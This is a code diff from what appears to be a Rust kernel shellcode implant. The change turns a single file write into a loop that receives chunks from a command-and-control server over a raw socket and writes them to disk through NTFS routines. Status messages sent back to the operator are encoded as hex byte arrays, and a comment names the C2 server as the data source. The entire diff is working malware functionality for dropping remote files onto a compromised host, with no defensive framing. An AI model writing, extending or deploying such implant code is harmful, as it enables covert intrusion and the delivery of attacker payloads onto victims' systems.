@@ -305,13 +305,27 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                     }
                 };
                 if file_open_error == 0 as _ {
-                    let status = ntfs::write_file(fs_funcs, handle, buf as _, buf_len as _);
-                    if status == 0 as _ {
-                        let write_success_msg = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                        let _ = socket.send(&write_success_msg as *const u8, 14);
-                    } else {
-                        let write_failed_msg = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8, 0x66u8, 0x61u8, 0x69u8, 0x6cu8, 0x65u8, 0x64u8, 0x0au8];
-                        let _ = socket.send(&write_failed_msg as *const u8, 13);                        
+                    let mut status: u32 = 0;
+                    while status == 0 {
+                        let send_data_to_write_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x64u8, 0x61u8, 0x74u8, 0x61u8, 0x20u8, 0x74u8, 0x6fu8, 0x20u8, 0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x0au8];                    
+                        let _ = socket.send(&send_data_to_write_msg as *const u8, 19);
+                        (buf_len, exec) = recv_msg(tdi_ctx, buf);
+                        status = ntfs::write_file(fs_funcs, handle, buf as _, buf_len as _);
+                        if status == 0 as _ {
+                            let write_success_msg = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
+                            let _ = socket.send(&write_success_msg as *const u8, 14);
+                        } else {
+                            let write_failed_msg = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8, 0x66u8, 0x61u8, 0x69u8, 0x6cu8, 0x65u8, 0x64u8, 0x0au8];
+                            let _ = socket.send(&write_failed_msg as *const u8, 13);                        
+                        }
+                        if buf_len < 1460 as _ {
+                            /*
+                            It is a break from the while; the idea is that if the C2 server sends less
+                            than the maximum number of bytes it can send, then it doesn't have
+                            anything else to send.
+                            */
+                            status = 1;
+                        }
                     }
                     ntfs::close_handle(fs_funcs, handle);
                 } else {
